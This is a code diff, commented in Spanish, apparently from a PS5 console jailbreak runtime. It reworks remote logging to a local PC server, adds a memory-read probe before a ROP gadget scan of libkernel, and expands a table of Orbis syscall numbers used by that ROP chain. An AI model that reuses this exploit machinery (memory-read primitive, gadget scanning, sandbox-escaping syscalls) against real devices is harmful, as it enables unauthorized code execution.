@@ -35,11 +35,28 @@
         94: "ECAPMODE",
     };
 
+    // [Mods consola] Log remoto unificado con el runtime Y2JB: POST al
+    // log_server.py del PC (puerto 8080). Configurable y auto-descubierto:
+    //   1) window.LOG_SERVER (lo fija setlogserver.js del runtime, o ?logserver=)
+    //   2) http://<host-de-la-pagina>:8080/log  (sin esquema/relativo -> 404)
+    // Si no hay servidor no pasa nada: solo se pierde telemetria, nunca rompe.
+    let LOG_SERVER = (function () {
+        try {
+            const qp = new URLSearchParams(location.search).get("logserver");
+            if (qp) return qp;
+            if (typeof window !== "undefined" && window.LOG_SERVER) return window.LOG_SERVER;
+            return "http://" + location.hostname + ":8080/log";
+        } catch (e) { return ""; }
+    })();
+    let logRemoteOK = false;
     function httpLog(line) {
+        if (!LOG_SERVER) return;
         try {
             const x = new XMLHttpRequest();
-            x.open("GET", "log/" + encodeURIComponent(line), false);
-            x.send();
+            x.open("POST", LOG_SERVER, true);
+            x.setRequestHeader("Content-Type", "text/plain");
+            x.send(String(line));
+            logRemoteOK = true;
         } catch (e) {}
     }
     async function log(msg) {
@@ -209,8 +226,7 @@
         for (let off = 0; off < KTEXT; off += CHUNK) {
             // cada chunk se extiende OVER bytes mas alla para no perder
             // gadgets que cruzan la frontera
-            const len = Math.min(CHUNK + OVER, KTEXT - off);
-            const mem = rdBytes(ctx.libkernelBase + off, len);
+            const mem = rdBytes(ctx.libkernelBase + off, lenFor(off));
             const memBase = ctx.libkernelBase + off;
             for (const k in GADPAT) {
                 if (g[k] !== undefined && g[k] !== null) continue;
@@ -232,6 +248,35 @@
             return false;
         }
         return true;
+    }
+    function lenFor(off) { return Math.min(0x2000 + 16, KTEXT - off); }
+    // [Mods consola] El escaneo de gadgets LEE el .text de libkernel, que post-init
+    // puede estar protegido (la sesion de consola documenta SIGSEGV al leer modulos
+    // protegidos). Hacemos una sonda NO destructiva de 1 byte: si `aim` falla o no
+    // hay base, NO escaneamos y caemos a modo DIRECT (solo notify/nativeCall, que es
+    // lo unico que el POC valida sin leer text). `?rop=0` fuerza DIRECT siempre.
+    function ropProbe() {
+        const qp = (function () {
+            try { return new URLSearchParams(location.search).get("rop"); }
+            catch (e) { return null; }
+        })();
+        if (qp === "0") { PS5.notes.push("rop-forced-direct"); return false; }
+        if (!(ctx.libkernelBase > 0x800000000 && ctx.libkernelBase < 0x900000000)) {
+            PS5.notes.push("rop-no-libkernel-base");
+            return false;
+        }
+        try {
+            const v = ctx.aim(ctx.libkernelBase);   // 1 byte: primer byte de .text
+            if (v === null || v === undefined) {
+                PS5.notes.push("rop-probe-null");
+                return false;
+            }
+            PS5.notes.push("rop-probe-ok:0x" + (v[0] & 0xff).toString(16));
+            return true;
+        } catch (e) {
+            PS5.notes.push("rop-probe-threw:" + String(e.message || e).slice(0, 40));
+            return false;
+        }
     }
 
     // ---------- syscall modo ROP ----------
@@ -287,14 +332,27 @@
     function syscallDirect(num, args) {
         throw new Error("syscall-" + num + "-unavailable:rop-gadgets-missing");
     }
+    // [Mods consola] Tabla Orbis real (fuente: global.js del runtime Y2JB 1.7).
+    // Los numeros deben ser EXACTOS: la tabla anterior tenia inventados/ausentes
+    // (kill, getuid, thr_self, umtx_op, sysctl, dlsym...). Solo se anaden las
+    // entradas con numero confirmado; las dudosas llevan comentario.
     const SYSN = {
-        read: 3, write: 4, open: 5, close: 6, getpid: 20, ioctl: 54,
-        munmap: 73, mprotect: 74, socket: 97, connect: 98, bind: 104,
-        listen: 106, setsockopt: 105, sendto: 133, recvfrom: 29,
-        accept: 30, socketex: 113, socketclose: 114, shutdown: 134,
-        socketpair: 135, kqueueex: 141, mmap: 477, lseek: 478,
-        pipe: 42, nanosleep: 240, sched_yield: 331, aio_read: 257,
-        aio_write: 258, aio_fsync: 259, aio_multi: 260,
+        read: 0x3, write: 0x4, open: 0x5, close: 0x6, unlink: 0xa,
+        chmod: 0xf, getpid: 0x14, kill: 0x25, pipe: 0x2a,
+        ioctl: 0x36, munmap: 0x49, mprotect: 0x4a, fcntl: 0x5c,
+        select: 0x5d, dup2: 0x5a, fsync: 0x5f, socket: 0x61,
+        connect: 0x62, bind: 0x68, setsockopt: 0x69, listen: 0x6a,
+        getsockopt: 0x76, getsockname: 0x20, netgetiflist: 0x7d,
+        sendto: 0x85, recvfrom: 0x1d, accept: 0x1e, mkdir: 0x88,
+        rmdir: 0x89, rename: 0x80, stat: 0xbc, fstat: 0xbd,
+        getdents: 0x110, sysctl: 0xca, nanosleep: 0xf0,
+        sched_yield: 0x14b, sigaction: 0x1a0, thr_self: 0x1b0,
+        thr_new: 0x1c7, thr_exit: 0x1af, umtx_op: 0x1c6,
+        dlsym: 0x24f, dynlib_load_prx: 0x252, dynlib_unload_prx: 0x253,
+        randomized_path: 0x25a, is_in_sandbox: 0x249, mmap: 0x1dd,
+        lseek: 0x1de, ftruncate: 0x1e0, jitshm_create: 0x215,
+        jitshm_alias: 0x216, cpuset_getaffinity: 0x1e7,
+        cpuset_setaffinity: 0x1e8, rtprio_thread: 0x1d2,
     };
     function syscall(which, ...args) {
         let num = which;
@@ -322,7 +380,7 @@
                 PS5.notes.push("arena-sentinel-ok");
         } catch (e) {}
         let ropOK = false;
-        try { ropOK = scanGadgets(); }
+        try { if (ropProbe()) ropOK = scanGadgets(); }
         catch (e) { PS5.notes.push("scan-threw:" + String(e.message || e).slice(0, 60)); }
         PS5.mode = ropOK ? "ROP" : "DIRECT";
         PS5.ready = true;
